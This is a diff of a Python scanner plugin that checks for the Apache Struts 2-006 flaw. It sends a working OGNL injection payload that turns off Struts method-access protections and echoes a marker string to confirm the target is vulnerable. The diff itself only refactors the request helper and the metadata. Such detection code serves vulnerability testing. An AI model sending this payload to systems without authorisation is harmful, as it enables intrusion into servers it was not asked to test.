@@ -2,19 +2,14 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-import time
-import requests
-requests.packages.urllib3.disable_warnings()
-
-
-def get_script_info(data=None):
-    script_info = {
+def info(data=None):
+    info = {
         "name": "Struts 2-006",
         "info": "Struts 2-006.",
         "level": "high",
-        "type": "info",
+        "type": "rec",
     }
-    return script_info
+    return info
 
 
 def prove(data):
@@ -23,7 +18,7 @@ def prove(data):
         try:
             prove_poc = "('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#req=@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('#xman=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('#xman.getWriter().println(%22@struts2_006_vul@%22)')(d))&(i99)(('#xman.getWriter().close()')(d))=1"
             poc_key = '''@struts2_006_vul@'''
-            res = requests.post(data['url'], headers=data['headers'], verify=False, data=prove_poc,timeout=data['timeout']).text
+            res = curl('post',data['url'], data=prove_poc).text
             if res and res.find(poc_key) != -1:
                 data['flag'] = 1
                 data['data'].append({"poc": prove_poc})
